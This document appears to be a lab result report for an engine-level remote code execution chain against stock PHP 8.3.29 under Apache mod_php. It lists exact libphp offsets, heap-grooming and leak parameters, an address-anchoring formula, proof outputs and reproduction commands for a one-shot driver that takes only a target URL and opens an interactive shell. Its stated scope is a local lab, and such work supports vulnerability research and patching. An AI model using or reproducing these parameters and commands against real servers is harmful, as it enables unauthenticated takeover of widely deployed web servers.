# PHP 8.3.29 mod_php — engine-level RCE (PHP2SHELL)

**Status: SOLID — reproduced.**
Command execution as `www-data` on stock `php:8.3.29-apache` (mod_php,
`php.ini-production`, 128M memory limit) through the pure-HTTP
CVE-2026-109618/109619 chain, with no plugins, no file writes before RCE,
and no credentials.

| | |
|---|---|
| Target image | `php@sha256:59e644d448b18e78c36bcbec33cf473a6ba64d812e994e821715d1b666519627` (`php:8.3.29-apache`) |
| libphp.so SHA-256 | `29b728904da3de4bbd9da723c198e4a834c4d59e2e56b0974a65edef9f0f26ae` |
| Lab container | `p2s-8329`, `127.0.0.1:18129` |
| Apache | single worker (`StartServers 1`, `MaxRequestWorkers 1`, `ServerLimit 1`) |
| Date | 2026-10-23 |

## Verdict

The 8.3 profile is calibrated and proven end-to-end. Eight chain executions
across five fresh ASLR instances all succeeded on the first chain attempt;
every one returned command output from the target process. The URL-only
one-shot driver auto-selects the profile from the `X-Powered-By` banner and
ran the proof plus two further commands in a single interactive session.

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux 5.15.153.1-microsoft-standard-WSL2
www-data
```

## Proof runs

| # | Context | Command | Output | Evidence |
|---|---|---|---|---|
| 1 | fresh ASLR | `id` | `uid=33(www-data) ...` | `evidence/chain-8329-dtor.log`, `evidence/proof-run1-id.txt` |
| 2 | fresh ASLR | `uname -sr` | `Linux 5.15.153.1-microsoft-standard-WSL2` | `evidence/chain-8329-run2.log`, `evidence/proof-run2-uname.txt` |
| 3 | fresh ASLR | `whoami; ls -la /out` | `www-data` + proof dir listing | `evidence/chain-8329-run3.log`, `evidence/proof-run3-whoami-ls.txt` |
| 4 | same child, no restart | `echo chain1` | `chain1` | `evidence/repeat-1.log`, `evidence/proof-repeat-chain1.txt` |
| 5 | same child, no restart | `echo chain2` | `chain2` | `evidence/repeat-2.log`, `evidence/proof-repeat-chain2.txt` |
| 6 | one-shot, profile proof | `id` | `uid=33(www-data) ...` | `evidence/oneshot-8329-session.log`, `evidence/proof-oneshot-id.txt` |
| 7 | one-shot, interactive | `id` | `uid=33(www-data) ...` | `evidence/proof-oneshot-interactive-id.txt` |
| 8 | one-shot, interactive | `uname -sr` | `Linux 5.15.153.1-microsoft-standard-WSL2` | `evidence/proof-oneshot-uname.txt` |

All eight were first chain attempt (`[try 1/3]`). Runs 4–5 reused one child
(same ASLR addresses for both chains), confirming the heap stays usable
between consecutive full chains.

## Chain parameters (8.3.29)

| Stage | Parameter | Value |
|---|---|---|
| Offsets | `zif_system` | `libphp + 0x3ABDC0` |
| | `zval_ptr_dtor` | `libphp + 0x49DB50` |
| A1 | `PHP_SESSION_UPLOAD_PROGRESS` length | `1000` |
| B1 | field spec | `G:300:0xE2 ×16 + X:900` |
| | forged `zend_string` length | `0xC8000` |
| | intra-page offset of forged header | `0x968` |
| | decoded leak window | `819208` bytes |
| | valid `Set-Cookie` size | ~1.26 MB |
| S | anchor | `S = (zval_ptr_dtor & ~0x1FFFFF) - 0x2000000 + 0xF9398` |
| | carrier chunk | `(zval_ptr_dtor & ~0x1FFFFF) - 0x2000000` |
| | fake HashTable offset in chunk | `0xF9398` (second copy `+0x1C0`, harmless) |
| A2 | cheap-OOM grooming | `parts=880`, `depth=64`, `fillers=115` |
| B2 | fake `zend_reference` | `vl=384`, `n1=500`, `n2=495`, `rc=1` |

### Why the dtor anchor

On 8.3 the leak's high-count "main candidate" (the 165-pointer bucket) points
into a chunk that is unmapped after the request; anchoring `S` there misses.
`zval_ptr_dtor` is always present in the leak window, so its 2 MB bucket is
used as the heap-chunk origin instead:

```
carrier_chunk = (0x7f54d124bb50 & ~0x1FFFFF) - 0x2000000 = 0x7f54cf200000
S             = 0x7f54cf200000 + 0xF9398                   = 0x7f54cf2f9398
```

Calibrated against the gdb marker `P2S_CALIB_8329` at `php_request_shutdown`
(marker at `ht+0x98`, fake-array header validated with `arData == ht+0x20`):
3/3 valid diagnostics matched the predicted `S` exactly
(`leak-dbg2/4/5`, values in `evidence/calib-leak-dbg*.log`).
The relation held across three independent ASLR layouts.

## Operational notes

- **Leak reliability.** A valid B1 returns a 200 with a ~1.26 MB `Set-Cookie`
  and `decoded=819208`. Invalid windows carry no usable libphp pointers; the
  Linux page-alignment sanity check rejects a non-page-aligned base and the
  chain retries instead of continuing with junk.
- **Duplicate leak hazard.** On 8.3, a standalone A1+B1 leak followed by
  another A1+B1 without an intervening A2/B2 can abort the child
  (`zend_mm_heap corrupted`, SIGABRT) and the second B1 returns 0 bytes.
  The URL-only driver therefore validates the profile by running the first
  full chain (leak + A2/B2 + `id`), never a standalone leak.
- **Child respawn.** When a child does abort, Apache respawns it and the next
  chain attempt succeeds; this is what the engine's retry loop absorbs.
- **8.4 regression.** The same one-shot flow against the 8.4.26 lab
  auto-selected the 8.4 profile and returned `id` after two 0-byte B1
  attempts (stale crashed child), then ran the interactive `id` on the first
  attempt. The profile split did not regress the proven 8.4 path
  (`evidence/regression-8426-oneshot.log`,
  `evidence/regression-8426-id.txt`,
  `evidence/regression-8426-interactive-id.txt`).

## Reproduction

Raw chain (local lab):

```sh
SPEC=$(python3 -c "print(','.join(['G:300:0xE2']*16+['X:900']))")
python3 ../oneshot/pure_shell.py \
  --host 127.0.0.1 --port 18129 --path /index.php --outdir ./out \
  --zif 0x3abdc0 --dtor 0x49db50 --a1-progress 1000 \
  --b1-fake-len 0xC8000 --b1-spec "$SPEC" --b1-page-off 0x968 \
  --s-mode dtor --dtor-anchor=-0x2000000 --fake-array-delta 0xF9398 \
  --exec 'id'
```

URL-only one-shot (only input is the URL; further lines are commands):

```sh
printf 'http://127.0.0.1:18129/index.php\nid\nuname -sr\nexit\n' | \
  P2S_OUTDIR=$PWD/out python3 ../oneshot/exploit.py
```

## Files

- `lab-8329/run.sh` — lab bootstrap (image, single-worker Apache, `/out` mount)
- `lab-8329/evidence/libphp-sha256.txt` — engine identity (the binary is derived from the recorded image digest and is not committed)
- `lab-8329/evidence/` — chain logs, calibration logs, proof files
- `oneshot/exploit.py` — URL-only driver, `PROFILES["8.3"]`, banner selection
- `oneshot/pure_shell.py` — engine (`--s-mode dtor`, `--dtor-anchor`, `--b1-page-off`)
- `oneshot/payloads/mk_leak_b.py` — B1 builder (`--page-off` forging)

Scope: local Docker lab only. The last affected 8.3 release is proven in
`lab-8335/RESULT.md`. The 8.2.35, 8.3.36, 8.4.27, and 8.5.12 fixed
boundaries are covered by the driver gate; no dedicated fixed-build
negative-control lab is included in this repository.
